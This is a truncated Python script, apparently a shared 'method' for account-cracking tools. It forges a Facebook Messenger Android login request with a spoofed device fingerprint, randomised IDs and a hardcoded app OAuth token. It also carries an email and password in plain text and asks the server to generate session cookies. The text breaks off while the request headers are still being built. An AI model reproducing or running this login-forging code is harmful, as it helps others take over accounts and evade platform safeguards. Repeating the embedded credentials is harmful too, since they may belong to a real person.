"""method B-API full Working cng UID Password"""
"""METHOD BY MASTER MIND"""
import json, requests, uuid, random

# User credentials and other parameters
uid = "ami@outlook.com"
ps = "jon139"
user_agent = "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;] FBBK/1"

# Generate random UUIDs
adid = str(uuid.uuid4())
deviceid = str(uuid.uuid4())
fm_deviceid = str(uuid.uuid4())

# Data for the POST request
data = {
    'adid': adid,
    'format': 'json',
    'device_id': deviceid,
    'email': uid,
    'password': ps,
    'generate_analytics_claims': '1',
    'credentials_type': 'password',
    'source': 'login',
    'error_detail_type': 'button_with_disabled',
    'enroll_misauth': 'false',
    'generate_session_cookies': '1',
    'generate_machine_id': '1',
    'meta_inf_fbmeta': '',
    'currently_logged_in_userid': '0',
    'fb_api_req_friendly_name': 'authenticate'
}

# Headers for the POST request
head = {
    'User-Agent': user_agent,
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
    'X-FB-Friendly-Name': 'authenticate',
    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
    'X-FB-Net-HNI': str(random.r
